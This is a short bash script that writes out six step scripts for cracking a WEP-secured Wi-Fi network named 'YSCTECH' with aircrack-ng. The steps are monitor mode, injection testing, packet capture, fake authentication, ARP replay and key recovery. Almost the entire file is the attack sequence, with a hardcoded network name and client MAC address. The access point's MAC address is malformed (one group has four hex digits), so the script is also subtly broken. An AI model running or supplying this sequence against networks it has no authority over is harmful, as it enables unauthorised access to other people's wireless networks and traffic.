#!/bin/bash
# make script made with help from
# http://www.aircrack-ng.org/doku.php?id=simple_wep_crack

host_mac=00:23:4d:4e:e2:7d
root=$(pwd)
  
  cd ${root}
  mkdir "YSCTECH" 2>/dev/null
  cd "YSCTECH"
  # step 1
echo -e $(cat <<+
 
  #!/bin/bash\n
 
  airmon-ng stop mon0\n
 
  airmon-ng start wlan0 6\n
   
+
) > step1.sh
  #step 2
echo -e $(cat <<+
 #!/bin/bash\n
 
 aireplay-ng -9 -e YSCTECH -a 00:13:10:4c0b:14 mon0  
+
) > step2.sh
  # step 3
echo -e $(cat <<+
 #!/bin/bash \n
 
 airodump-ng -c 6 --bssid 00:13:10:4c0b:14 -w output mon0  
+
) > step3.sh
  # step 4
echo -e $(cat <<+
 #!/bin/bash\n
 
 aireplay-ng -1 0 -e YSCTECH -a 00:13:10:4c0b:14 -h ${host_mac} mon0  
+
) > step4.sh
  # step 5
echo -e $(cat <<+
 #!/bin/bash\n
 
 aireplay-ng -3 -b 00:13:10:4c0b:14 -h  ${host_mac} mon0  
+
) > step5.sh
  # step 6
echo -e $(cat <<+
 #!/bin/bash\n
 
 aircrack-ng -b 00:13:10:4c0b:14 output*.cap
   
+
) > step6.sh
chmod +x *.sh
 